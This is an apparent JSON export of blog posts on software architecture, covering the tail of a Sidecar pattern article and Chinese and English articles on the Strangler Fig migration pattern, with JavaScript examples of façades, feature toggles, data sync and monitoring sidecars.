Concerns: Logging, monitoring, configuration that applies to all services Third-Party Integration: Adding capabilities to applications you don't control Independent Scaling: Sidecar and application have different resource needs Real-World Examples Microservices Platform Service mesh proxies (Envoy, Linkerd) Log collectors (Fluentd, Filebeat) Metrics exporters (Prometheus exporters) Secret managers Legacy Application Modernization Add monitoring to legacy apps Implement modern authentication Enable service discovery Add circuit breaking When to Avoid ❌ Not Suitable WhenTight Performance Requirements: Inter-process communication overhead is unacceptable Simple Applications: Overhead of managing sidecars exceeds benefits Deep Integration Needed: Sidecar needs access to application internals Independent Scaling Required: Sidecar and application need different scaling strategies Considerations and Trade-offs Deployment Complexity Managing multiple containers per application instance: # Before: Simple deployment docker run my-app:latest # After: Coordinated deployment docker-compose up # or kubectl apply -f deployment.yaml 📝 Complexity ManagementUse container orchestration platforms (Kubernetes, Docker Swarm) to manage sidecar lifecycle automatically. Resource Overhead Each application instance now runs multiple processes: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_1432340bf')); var option = { \"title\": { \"text\": \"Resource Usage: Standalone vs Sidecar\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Standalone App\", \"App + Sidecar\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"CPU\", \"Memory\", \"Network\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Resource Units\" }, \"series\": [ { \"name\": \"Standalone App\", \"type\": \"bar\", \"data\": [100, 100, 100], \"itemStyle\": { \"color\": \"#4dabf7\" } }, { \"name\": \"App + Sidecar\", \"type\": \"bar\", \"data\": [120, 130, 110], \"itemStyle\": { \"color\": \"#ffd43b\" } } ] }; chart.setOption(option); } })(); Communication Latency Inter-process communication adds overhead: &#x2F;&#x2F; Direct function call: ~1 microsecond this.logger.log(&#39;message&#39;); &#x2F;&#x2F; HTTP to sidecar: ~1 millisecond await fetch(&#39;http:&#x2F;&#x2F;localhost:9090&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;message&#39; &#125;) &#125;); &#x2F;&#x2F; Shared volume: ~100 microseconds await fs.appendFile(&#39;&#x2F;logs&#x2F;app.log&#39;, &#39;message\\n&#39;); 💡 Optimization StrategiesUse Localhost: Minimize network overhead Batch Operations: Aggregate multiple calls Async Communication: Don't wait for sidecar responses Shared Memory: Use memory-mapped files for high-frequency data Complete Implementation Example Here’s a comprehensive example with application and monitoring sidecar: &#x2F;&#x2F; main-app.js - Application const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); class Application &#123; constructor() &#123; this.requestCount &#x3D; 0; this.errorCount &#x3D; 0; &#125; &#x2F;&#x2F; Business logic endpoints setupRoutes() &#123; app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; this.requestCount++; try &#123; const order &#x3D; await this.processOrder(req.body); console.log(&#39;Order processed:&#39;, order.id); res.json(order); &#125; catch (error) &#123; this.errorCount++; console.error(&#39;Order failed:&#39;, error.message); res.status(500).json(&#123; error: error.message &#125;); &#125; &#125;); &#x2F;&#x2F; Metrics endpoint for sidecar app.get(&#39;&#x2F;internal&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: this.requestCount, errors: this.errorCount, uptime: process.uptime() &#125;); &#125;); &#125; async processOrder(orderData) &#123; &#x2F;&#x2F; Business logic here return &#123; id: Date.now(), ...orderData &#125;; &#125; start() &#123; this.setupRoutes(); app.listen(8080, () &#x3D;&gt; &#123; console.log(&#39;Application running on port 8080&#39;); &#125;); &#125; &#125; new Application().start(); &#x2F;&#x2F; monitoring-sidecar.js - Monitoring Sidecar const fetch &#x3D; require(&#39;node-fetch&#39;); class MonitoringSidecar &#123; constructor() &#123; this.metricsEndpoint &#x3D; &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;internal&#x2F;metrics&#39;; this.exportEndpoint &#x3D; process.env.METRICS_EXPORT_URL; &#125; async collectMetrics() &#123; try &#123; const response &#x3D; await fetch(this.metricsEndpoint); const metrics &#x3D; await response.json(); &#x2F;&#x2F; Enrich with environment data const enrichedMetrics &#x3D; &#123; ...metrics, hostname: require(&#39;os&#39;).hostname(), timestamp: new Date().toISOString(), environment: process.env.ENVIRONMENT, version: process.env.APP_VERSION &#125;; &#x2F;&#x2F; Export to monitoring system await this.exportMetrics(enrichedMetrics); console.log(&#39;Metrics collected:&#39;, enrichedMetrics); &#125; catch (error) &#123; console.error(&#39;Failed to collect metrics:&#39;, error.message); &#125; &#125; async exportMetrics(metrics) &#123; if (!this.exportEndpoint) return; await fetch(this.exportEndpoint, &#123; method: &#39;POST&#39;, headers: &#123; &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(metrics) &#125;); &#125; start() &#123; console.log(&#39;Monitoring sidecar started&#39;); &#x2F;&#x2F; Collect metrics every 10 seconds setInterval(() &#x3D;&gt; this.collectMetrics(), 10000); &#125; &#125; new MonitoringSidecar().start(); # docker-compose.yml - Deployment Configuration version: &#39;3.8&#39; services: app: build: .&#x2F;app ports: - &quot;8080:8080&quot; environment: - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 networks: - app-network monitoring-sidecar: build: .&#x2F;monitoring-sidecar environment: - METRICS_EXPORT_URL&#x3D;http:&#x2F;&#x2F;metrics-server:9090&#x2F;api&#x2F;metrics - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 depends_on: - app networks: - app-network networks: app-network: driver: bridge Relationship to Other Patterns Ambassador Pattern The Ambassador pattern is a specialized sidecar for network communication: &#x2F;&#x2F; Ambassador sidecar handles all outbound requests class AmbassadorSidecar &#123; async proxyRequest(target, request) &#123; &#x2F;&#x2F; Service discovery const endpoint &#x3D; await this.discover(target); &#x2F;&#x2F; Circuit breaking if (this.isCircuitOpen(target)) &#123; throw new Error(&#39;Circuit breaker open&#39;); &#125; &#x2F;&#x2F; Retry logic return await this.retryWithBackoff(() &#x3D;&gt; fetch(endpoint, request) ); &#125; &#125; Adapter Pattern The Adapter pattern is a sidecar that translates interfaces: &#x2F;&#x2F; Adapter sidecar translates legacy protocol to modern API class AdapterSidecar &#123; async translateRequest(legacyRequest) &#123; &#x2F;&#x2F; Convert legacy format to modern format const modernRequest &#x3D; &#123; method: legacyRequest.action, data: this.transformData(legacyRequest.payload) &#125;; &#x2F;&#x2F; Forward to modern service return await this.forwardToModernService(modernRequest); &#125; &#125; Conclusion The Sidecar pattern provides a powerful way to extend application capabilities without modifying application code. By deploying supporting components as separate processes or containers, you gain: Language independence - Use the best tool for each job Isolation - Failures don’t cascade Flexibility - Update components independently Reusability - Same sidecar across multiple applications While it introduces deployment complexity and resource overhead, the benefits often outweigh the costs, especially in microservices architectures and containerized environments. The pattern shines when you need to add cross-cutting concerns to multiple applications, modernize legacy systems, or build platforms that support heterogeneous technology stacks. References Microsoft Azure Architecture - Sidecar Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"Strangler Fig 模式：模式还是策略？","slug":"2019/06/Strangler-Fig-Pattern-zh-CN","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-CN/2019/06/Strangler-Fig-Pattern/","permalink":"https://neo01.com/zh-CN/2019/06/Strangler-Fig-Pattern/","excerpt":"通过逐步替换功能来增量迁移旧系统。但 Strangler Fig 真的是一个模式，还是一种迁移策略？让我们探索这个架构方法及其哲学分类。","text":"当面对一个难以维护的旧系统时，从头重写一切的诱惑很强烈。然而，历史告诉我们，&quot;大爆炸&quot;式的重写往往会惨败。Strangler Fig 模式提供了一个更务实的方法：逐步替换旧系统的每一部分，直到什么都不剩。 但这里有一个有趣的问题：Strangler Fig 真的是传统意义上的&quot;模式&quot;，还是更准确地说是一种迁移&quot;策略&quot;？让我们探索实际实现和这个哲学区别。 起源故事 这个名字来自热带雨林中的绞杀榕树。这些树以种子的形式沉积在宿主树上开始生命。随着它们生长，它们将根向下延伸到地面，并逐渐包围宿主树。最终，宿主树死亡并分解，留下无花果树独立站立——这是系统迁移的完美隐喻。 核心概念 Strangler Fig 提供了一种增量的现代化方法。与其一次性替换整个系统，你可以： 引入门面（代理），位于客户端和旧系统之间 逐步在现代系统中实现新功能 智能路由请求在新旧系统之间 停用旧系统，一旦所有功能都已迁移 移除门面，当迁移完成时 graph LR A[客户端] --> B[门面/代理] B -->|旧功能| C[旧系统] B -->|新功能| D[新系统] C --> E[(旧数据库)] D --> F[(新数据库)] style B fill:#ffd43b,stroke:#fab005 style C fill:#fa5252,stroke:#c92a2a style D fill:#51cf66,stroke:#2f9e44 运作方式：实际旅程 让我们走过一个具体的例子：将电子商务平台从单体架构迁移到微服务。 阶段 1：建立门面 第一步是引入一个可以引导流量的路由层： class StranglerFacade &#123; constructor(legacySystem, newSystem) &#123; this.legacy &#x3D; legacySystem; this.modern &#x3D; newSystem; this.featureFlags &#x3D; new FeatureToggleService(); &#125; async handleRequest(request) &#123; const route &#x3D; this.determineRoute(request); if (route &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; return await this.modern.handle(request); &#125; return await this.legacy.handle(request); &#125; determineRoute(request) &#123; &#x2F;&#x2F; 基于功能标志、用户区段或端点进行路由 if (this.featureFlags.isEnabled(&#39;new-checkout&#39;, request.user)) &#123; return &#39;modern&#39;; &#125; if (request.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#39;modern&#39;; &#125; return &#39;legacy&#39;; &#125; &#125; 阶段 2：增量迁移 从低风险、高价值的功能开始： &#x2F;&#x2F; 第 1 周：迁移产品搜索 app.get(&#39;&#x2F;search&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有更好性能的新搜索服务 const results &#x3D; await newSearchService.search(req.query); res.json(results); &#125;); &#x2F;&#x2F; 第 4 周：迁移用户认证 app.post(&#39;&#x2F;login&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有现代安全性的新认证服务 const token &#x3D; await newAuthService.authenticate(req.body); res.json(&#123; token &#125;); &#125;); &#x2F;&#x2F; 第 8 周：迁移结账流程 app.post(&#39;&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有改进 UX 的新结账 const order &#x3D; await newCheckoutService.process(req.body); res.json(order); &#125;); 阶段 3：处理数据迁移 最棘手的方面之一是管理两个系统之间的数据： graph TD A[客户端请求] --> B[门面] B --> C{哪个系统？} C -->|新功能| D[新服务] C -->|旧功能| E[旧服务] D --> F[写入新数据库] D --> G[同步到旧数据库] E --> H[写入旧数据库] E --> I[同步到新数据库] style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 style E fill:#fa5252,stroke:#c92a2a class DataSyncService &#123; async syncOrder(order) &#123; &#x2F;&#x2F; 写入新系统 await newDatabase.orders.create(order); &#x2F;&#x2F; 同步到仍在使用它的旧功能 await legacyDatabase.orders.create(this.transformToLegacy(order)); &#125; async migrateHistoricalData() &#123; &#x2F;&#x2F; 批次迁移现有数据 const legacyOrders &#x3D; await legacyDatabase.orders.findAll(); for (const order of legacyOrders) &#123; const modernOrder &#x3D; this.transformToModern(order); await newDatabase.orders.create(modernOrder); &#125; &#125; &#125; 阶段 4：完成迁移 一旦所有功能都已迁移： &#x2F;&#x2F; 之前：门面路由 app.use(stranglerFacade.middleware()); &#x2F;&#x2F; 之后：直接路由到新系统 app.use(newSystem.middleware()); &#x2F;&#x2F; 停用旧系统 await legacySystem.shutdown(); await legacyDatabase.archive(); 模式 vs. 策略：哲学辩论 这里事情变得有趣了。Strangler Fig 是&quot;模式&quot;还是&quot;策略&quot;？ &quot;模式&quot;的论点 📐 模式特征结构化解决方案：Strangler Fig 定义了一个特定的结构（门面 + 双系统），解决了一个反复出现的问题。 可重用模板：这种方法可以应用于不同的技术和领域。 命名解决方案：它为讨论增量迁移提供了共同的词汇。 传统的设计模式（如四人帮书中的那些）描述了反复出现问题的结构化解决方案。Strangler Fig 符合这个定义——它规定了一个特定的架构结构（门面）和一个清晰的流程。 &quot;策略&quot;的论点 🎯 策略特征高层次方法：它更多的是关于整体迁移哲学，而不是具体的实现细节。 灵活实现：实际结构根据上下文有很大差异。 流程导向：它描述了一系列随时间推移的行动，而不仅仅是静态结构。 策略是实现目标的更广泛方法。Strangler Fig 从根本上是关于如何进行迁移——关于风险管理和变更管理的策略决策。 结论：两者兼具 ✅ 混合分类Strangler Fig 是一个策略模式——它结合了模式的结构特异性和策略的高层次指导。 它是一个模式，因为它规定了特定的架构组件（门面）。 它是一个策略，因为它指导了系统随时间演化的整体方法。 也许这种区别不如它提供的价值重要。无论你称它为模式还是策略，Strangler Fig 都为软件工程最困难的问题之一提供了经过验证的方法：安全地演化旧系统。 实现考量 1. 门面设计 门面是你的控制中心。仔细设计它： class IntelligentFacade &#123; constructor() &#123; this.router &#x3D; new SmartRouter(); this.monitor &#x3D; new MigrationMonitor(); this.fallback &#x3D; new FallbackHandler(); &#125; async route(request) &#123; try &#123; const target &#x3D; this.router.determineTarget(request); const response &#x3D; await target.handle(request); &#x2F;&#x2F; 监控成功率 this.monitor.recordSuccess(target.name); return response; &#125; catch (error) &#123; &#x2F;&#x2F; 错误时回退到旧系统 this.monitor.recordFailure(target.name); return await this.fallback.handleWithLegacy(request); &#125; &#125; &#125; ⚠️ 门面风险单点故障：门面成为关键基础设施。确保高可用性。 性能瓶颈：每个请求都通过门面。仔细优化。 复杂性增长：随着迁移进展，路由逻辑可能变得复杂。保持可维护性。 2. 功能切换策略 使用功能标志来控制迁移： class FeatureToggleService &#123; isEnabled(feature, context) &#123; &#x2F;&#x2F; 逐步推出 if (feature &#x3D;&#x3D;&#x3D; &#39;new-checkout&#39;) &#123; &#x2F;&#x2F; 10% 的用户 if (this.isInPercentage(context.userId, 10)) &#123; return true; &#125; &#x2F;&#x2F; Beta 测试者 if (context.user.isBetaTester) &#123; return true; &#125; &#x2F;&#x2F; 特定用户区段 if (context.user.segment &#x3D;&#x3D;&#x3D; &#39;premium&#39;) &#123; return true; &#125; &#125; return false; &#125; isInPercentage(userId, percentage) &#123; const hash &#x3D; this.hashUserId(userId); return (hash % 100) &lt; percentage; &#125; &#125; 3. 数据一致性管理 处理双写问题： class ConsistencyManager &#123; async writeWithConsistency(data) &#123; &#x2F;&#x2F; 首先写入新系统 const newResult &#x3D; await newSystem.write(data); try &#123; &#x2F;&#x2F; 同步到旧系统 await legacySystem.write(this.transform(data)); &#125; catch (error) &#123; &#x2F;&#x2F; 排队重试 await this.retryQueue.add(&#123; data, target: &#39;legacy&#39;, timestamp: Date.now() &#125;); &#125; return newResult; &#125; async reconcile() &#123; &#x2F;&#x2F; 定期一致性检查 const discrepancies &#x3D; await this.findDiscrepancies(); for (const item of discrepancies) &#123; await this.resolveConflict(item); &#125; &#125; &#125; 何时使用此方法 理想场景 ✅ 完美使用案例大型旧系统：当系统太大或太复杂而无法完全重写时。 需要业务连续性：当你无法承受停机或服务中断时。 需求不确定：当你不完全确定新系统应该是什么样子时。 风险缓解：当你需要最小化迁移失败的风险时。 真实世界范例 电子商务平台迁移 从产品目录开始 移至搜索功能 迁移结账流程 最后替换订单管理 银行系统现代化 从客户门户开始 迁移账户服务 更新交易处理 最后替换核心银行系统 内容管理系统 现代化内容交付 升级编辑工具 迁移资产管理 替换工作流程引擎 何时避免 ❌ 不适合的情况小型系统：当完全重写更简单、更快时。 无拦截点：当你无法引入门面或代理层时。 紧急替换：当旧系统必须因合规或安全原因立即停用时。 简单架构：当系统足够简单，增量迁移会增加不必要的复杂性时。 架构质量属性 可靠性 Strangler Fig 在迁移期间提高可靠性： 逐步引入风险：每个变更都很小且可逆 回退能力：如果新功能失败，可以恢复到旧系统 持续运作：系统在整个迁移过程中保持功能 class ReliabilityHandler &#123; async handleWithFallback(request) &#123; try &#123; return await newSystem.handle(request); &#125; catch (error) &#123; logger.warn(&#39;新系统失败，回退中&#39;, error); return await legacySystem.handle(request); &#125; &#125; &#125; 成本优化 虽然运行双系统有成本，但这种方法优化了长期投资： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_3d7f159d5')); var option = { \"title\": { \"text\": \"成本比较：大爆炸 vs. Strangler Fig\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"大爆炸重写\", \"Strangler Fig\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第 1 个月\", \"第 3 个月\", \"第 6 个月\", \"第 9 个月\", \"第 12 个月\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"成本\" }, \"series\": [ { \"name\": \"大爆炸重写\", \"type\": \"line\", \"data\": [100, 100, 100, 100, 150], \"itemStyle\": { \"color\": \"#fa5252\" }, \"lineStyle\": { \"type\": \"dashed\" } }, { \"name\": \"Strangler Fig\", \"type\": \"line\", \"data\": [20, 40, 60, 80, 100], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 成本优势： 随时间分散投资 增量交付价值 避免&quot;全有或全无&quot;风险 最大化现有系统的使用 卓越运营 增量方法支持持续改进： 小型、安全的变更：每个迁移步骤都是可管理的 学习机会：早期迁移为后期提供信息 团队适应：团队逐步建立新技术的专业知识 持续交付：在迁移期间可以发布新功能 完整实现范例 这是一个 API 网关门面的全面实现： class StranglerFigGateway &#123; constructor(config) &#123; this.legacy &#x3D; new LegacySystemClient(config.legacy); this.modern &#x3D; new ModernSystemClient(config.modern); this.features &#x3D; new FeatureToggleService(config.features); this.monitor &#x3D; new MonitoringService(config.monitoring); this.cache &#x3D; new CacheService(config.cache); &#125; async handleRequest(req, res) &#123; const startTime &#x3D; Date.now(); const route &#x3D; this.determineRoute(req); try &#123; let response; &#x2F;&#x2F; 首先检查缓存 const cacheKey &#x3D; this.getCacheKey(req); const cached &#x3D; await this.cache.get(cacheKey); if (cached) &#123; response &#x3D; cached; &#125; else &#123; &#x2F;&#x2F; 路由到适当的系统 if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; response &#x3D; await this.modern.handle(req); &#125; else &#123; response &#x3D; await this.legacy.handle(req); &#125; &#x2F;&#x2F; 如果适当则缓存 if (route.cacheable) &#123; await this.cache.set(cacheKey, response, route.ttl); &#125; &#125; &#x2F;&#x2F; 记录指标 this.monitor.recordRequest(&#123; target: route.target, duration: Date.now() - startTime, status: &#39;success&#39; &#125;); return res.json(response); &#125; catch (error) &#123; &#x2F;&#x2F; 回退逻辑 if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39; &amp;&amp; route.fallbackEnabled) &#123; try &#123; const fallbackResponse &#x3D; await this.legacy.handle(req); this.monitor.recordRequest(&#123; target: &#39;legacy-fallback&#39;, duration: Date.now() - startTime, status: &#39;fallback&#39; &#125;); return res.json(fallbackResponse); &#125; catch (fallbackError) &#123; this.monitor.recordError(fallbackError); return res.status(500).json(&#123; error: &#39;服务不可用&#39; &#125;); &#125; &#125; this.monitor.recordError(error); return res.status(500).json(&#123; error: error.message &#125;); &#125; &#125; determineRoute(req) &#123; &#x2F;&#x2F; 基于 API 版本的路由 if (req.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: true, ttl: 300 &#125;; &#125; &#x2F;&#x2F; 基于功能标志的路由 const feature &#x3D; this.extractFeature(req.path); if (this.features.isEnabled(feature, req.user)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: false &#125;; &#125; &#x2F;&#x2F; 默认为旧系统 return &#123; target: &#39;legacy&#39;, fallbackEnabled: false, cacheable: true, ttl: 600 &#125;; &#125; extractFeature(path) &#123; const pathMap &#x3D; &#123; &#39;&#x2F;products&#39;: &#39;new-catalog&#39;, &#39;&#x2F;search&#39;: &#39;new-search&#39;, &#39;&#x2F;checkout&#39;: &#39;new-checkout&#39;, &#39;&#x2F;orders&#39;: &#39;new-orders&#39; &#125;; for (const [prefix, feature] of Object.entries(pathMap)) &#123; if (path.startsWith(prefix)) &#123; return feature; &#125; &#125; return null; &#125; getCacheKey(req) &#123; return &#96;$&#123;req.method&#125;:$&#123;req.path&#125;:$&#123;JSON.stringify(req.query)&#125;&#96;; &#125; &#125; 迁移监控 追踪进度和健康状况： class MigrationDashboard &#123; async getMetrics() &#123; return &#123; trafficDistribution: await this.getTrafficSplit(), featureMigrationStatus: await this.getFeatureStatus(), errorRates: await this.getErrorRates(), performanceComparison: await this.getPerformanceMetrics() &#125;; &#125; async getTrafficSplit() &#123; const total &#x3D; await this.monitor.getTotalRequests(); const modern &#x3D; await this.monitor.getModernRequests(); return &#123; legacy: ((total - modern) &#x2F; total * 100).toFixed(1), modern: (modern &#x2F; total * 100).toFixed(1) &#125;; &#125; async getFeatureStatus() &#123; return &#123; completed: [&#39;product-catalog&#39;, &#39;search&#39;, &#39;user-auth&#39;], inProgress: [&#39;checkout&#39;, &#39;order-management&#39;], pending: [&#39;inventory&#39;, &#39;reporting&#39;, &#39;admin-panel&#39;] &#125;; &#125; &#125; 权衡与挑战 像任何架构方法一样，Strangler Fig 涉及权衡： ⚠️ 需要解决的挑战双系统开销：同时运行两个系统会增加基础设施成本和运营复杂性。 数据同步：在系统之间保持数据一致性具有挑战性且容易出错。 延长时间线：迁移比重写需要更长时间，这可能让利益相关者感到沮丧。 门面复杂性：随着迁移进展，路由层可能变得复杂且难以维护。 缓解策略： 设定明确的迁移里程碑并庆祝进展 自动化数据同步和验证 使用清晰的路由规则保持门面逻辑简单 监控成本并优化基础设施使用 从一开始就计划移除门面 相关模式和策略 Strangler Fig 与其他架构方法配合良好： Branch by Abstraction：类似的增量方法，但在代码层级而非系统层级 Parallel Run：同时运行两个系统以验证新系统行为 Blue-Green Deployment：在迁移完成时用于最终切换 Feature Toggles：对于控制哪些功能路由到新系统至关重要 Anti-Corruption Layer：保护新系统免受旧系统设计决策的影响 结论 无论你称它为模式还是策略，Strangler Fig 都为软件工程最具挑战性的问题之一提供了务实的方法：在不中断业务运作的情况下演化旧系统。 关键见解： 增量胜过革命：小型、安全的变更降低风险 门面实现灵活性：代理层让你控制迁移 业务连续性至关重要：系统在整个过程中保持运作 边做边学：早期迁移为后期决策提供信息 使用 Strangler Fig 取得成功需要耐心、纪律和清晰的沟通。这不是最快的方法，但通常是现代化复杂系统最安全、最可靠的方式。 模式 vs. 策略的辩论最终是学术性的。重要的是 Strangler Fig 为团队提供了一个经过验证的框架，让他们有信心地处理旧系统迁移。它将一个压倒性的挑战转化为一系列可管理的步骤，每个步骤都在朝着现代化、可维护系统的最终目标前进的同时交付价值。 参考资料 Martin Fowler: StranglerFigApplication Strangler Fig Pattern Sam Newman: Monolith to Microservices","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"Strangler Fig Pattern: Pattern or Strategy?","slug":"2019/06/Strangler-Fig-Pattern","date":"un66fin66","updated":"un22fin22","comments":true,"path":"2019/06/Strangler-Fig-Pattern/","permalink":"https://neo01.com/2019/06/Strangler-Fig-Pattern/","excerpt":"Incrementally migrate legacy systems by gradually replacing functionality with new services. But is Strangler Fig truly a pattern, or is it a migration strategy? Let's explore this architectural approach and its philosophical classification.","text":"When faced with a legacy system that’s become difficult to maintain, the temptation to rewrite everything from scratch is strong. However, history has taught us that “big bang” rewrites often fail spectacularly. The Strangler Fig pattern offers a more pragmatic approach: gradually replace the old system piece by piece until nothing remains. But here’s an interesting question: Is Strangler Fig really a “pattern” in the traditional sense, or is it more accurately described as a migration “strategy”? Let’s explore both the practical implementation and this philosophical distinction. The Origin Story The name comes from strangler fig trees found in tropical rainforests. These trees start life as seeds deposited on host trees. As they grow, they send roots down to the ground and gradually envelope the host tree. Eventually, the host tree dies and decomposes, leaving the fig tree standing in its place—a perfect metaphor for system migration. The Core Concept Strangler Fig provides an incremental approach to modernization. Instead of replacing an entire system at once, you: Introduce a façade (proxy) that sits between clients and the legacy system Gradually implement new functionality in a modern system Route requests intelligently between old and new systems Decommission the legacy system once all functionality is migrated Remove the façade when migration is complete graph LR A[Client] --> B[Façade/Proxy] B -->|Legacy Features| C[Legacy System] B -->|New Features| D[New System] C --> E[(Legacy Database)] D --> F[(New Database)] style B fill:#ffd43b,stroke:#fab005 style C fill:#fa5252,stroke:#c92a2a style D fill:#51cf66,stroke:#2f9e44 How It Works: A Practical Journey Let’s walk through a concrete example: migrating an e-commerce platform from a monolithic architecture to microservices. Phase 1: Establish the Façade The first step is introducing a routing layer that can direct traffic: class StranglerFacade &#123; constructor(legacySystem, newSystem) &#123; this.legacy &#x3D; legacySystem; this.modern &#x3D; newSystem; this.featureFlags &#x3D; new FeatureToggleService(); &#125; async handleRequest(request) &#123; const route &#x3D; this.determineRoute(request); if (route &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; return await this.modern.handle(request); &#125; return await this.legacy.handle(request); &#125; determineRoute(request) &#123; &#x2F;&#x2F; Route based on feature flags, user segments, or endpoints if (this.featureFlags.isEnabled(&#39;new-checkout&#39;, request.user)) &#123; return &#39;modern&#39;; &#125; if (request.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#39;modern&#39;; &#125; return &#39;legacy&#39;; &#125; &#125; Phase 2: Migrate Incrementally Start with low-risk, high-value features: &#x2F;&#x2F; Week 1: Migrate product search app.get(&#39;&#x2F;search&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; New search service with better performance const results &#x3D; await newSearchService.search(req.query); res.json(results); &#125;); &#x2F;&#x2F; Week 4: Migrate user authentication app.post(&#39;&#x2F;login&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; New auth service with modern security const token &#x3D; await newAuthService.authenticate(req.body); res.json(&#123; token &#125;); &#125;); &#x2F;&#x2F; Week 8: Migrate checkout process app.post(&#39;&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; New checkout with improved UX const order &#x3D; await newCheckoutService.process(req.body); res.json(order); &#125;); Phase 3: Handle Data Migration One of the trickiest aspects is managing data across both systems: graph TD A[Client Request] --> B[Façade] B --> C{Which System?} C -->|New Feature| D[New Service] C -->|Legacy Feature| E[Legacy Service] D --> F[Write to New DB] D --> G[Sync to Legacy DB] E --> H[Write to Legacy DB] E --> I[Sync to New DB] style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 style E fill:#fa5252,stroke:#c92a2a class DataSyncService &#123; async syncOrder(order) &#123; &#x2F;&#x2F; Write to new system await newDatabase.orders.create(order); &#x2F;&#x2F; Sync to legacy for features still using it await legacyDatabase.orders.create(this.transformToLegacy(order)); &#125; async migrateHistoricalData() &#123; &#x2F;&#x2F; Batch migration of existing data const legacyOrders &#x3D; await legacyDatabase.orders.findAll(); for (const order of legacyOrders) &#123; const modernOrder &#x3D; this.transformToModern(order); await newDatabase.orders.create(modernOrder); &#125; &#125; &#125; Phase 4: Complete Migration Once all functionality is migrated: &#x2F;&#x2F; Before: Façade routing app.use(stranglerFacade.middleware()); &#x2F;&#x2F; After: Direct routing to new system app.use(newSystem.middleware()); &#x2F;&#x2F; Decommission legacy system await legacySystem.shutdown(); await legacyDatabase.archive(); Pattern vs. Strategy: A Philosophical Debate Here’s where things get interesting. Is Strangler Fig a “pattern” or a “strategy”? The Case for “Pattern” 📐 Pattern CharacteristicsStructural Solution: Strangler Fig defines a specific structure (façade + dual systems) that solves a recurring problem. Reusable Template: The approach can be applied across different technologies and domains. Named Solution: It provides a common vocabulary for discussing incremental migration. Traditional design patterns (like those in the Gang of Four book) describe structural solutions to recurring problems. Strangler Fig fits this definition—it prescribes a specific architectural structure (the façade) and a clear process. The Case for “Strategy” 🎯 Strategy CharacteristicsHigh-Level Approach: It's more about the overall migration philosophy than specific implementation details. Flexible Implementation: The actual structure varies significantly based on context. Process-Oriented: It describes a sequence of actions over time, not just a static structure. Strategies are broader approaches to achieving goals. Strangler Fig is fundamentally about how to approach migration—a strategic decision about risk management and change management. The Verdict: It’s Both ✅ A Hybrid ClassificationStrangler Fig is a strategic pattern—it combines the structural specificity of a pattern with the high-level guidance of a strategy. It's a pattern because it prescribes specific architectural components (the façade). It's a strategy because it guides the overall approach to system evolution over time. Perhaps the distinction matters less than the value it provides. Whether you call it a pattern or strategy, Strangler Fig offers a proven approach to one of software engineering’s hardest problems: safely evolving legacy systems. Implementation Considerations 1. Façade Design The façade is your control center. Design it carefully: class IntelligentFacade &#123; constructor() &#123; this.router &#x3D; new SmartRouter(); this.monitor &#x3D; new MigrationMonitor(); this.fallback &#x3D; new FallbackHandler(); &#125; async route(request) &#123; try &#123; const target &#x3D; this.router.determineTarget(request); const response &#x3D; await target.handle(request); &#x2F;&#x2F; Monitor success rates this.monitor.recordSuccess(target.name); return response; &#125; catch (error) &#123; &#x2F;&#x2F; Fallback to legacy on errors this.monitor.recordFailure(target.name); return await this.fallback.handleWithLegacy(request); &#125; &#125; &#125; ⚠️ Façade RisksSingle Point of Failure: The façade becomes critical infrastructure. Ensure high availability. Performance Bottleneck: Every request passes through the façade. Optimize carefully. Complexity Growth: As migration progresses, routing logic can become complex. Keep it maintainable. 2. Feature Toggle Strategy Use feature flags to control migration: class FeatureToggleService &#123; isEnabled(feature, context) &#123; &#x2F;&#x2F; Gradual rollout if (feature &#x3D;&#x3D;&#x3D; &#39;new-checkout&#39;) &#123; &#x2F;&#x2F; 10% of users if (this.isInPercentage(context.userId, 10)) &#123; return true; &#125; &#x2F;&#x2F; Beta testers if (context.user.isBetaTester) &#123; return true; &#125; &#x2F;&#x2F; Specific user segments if 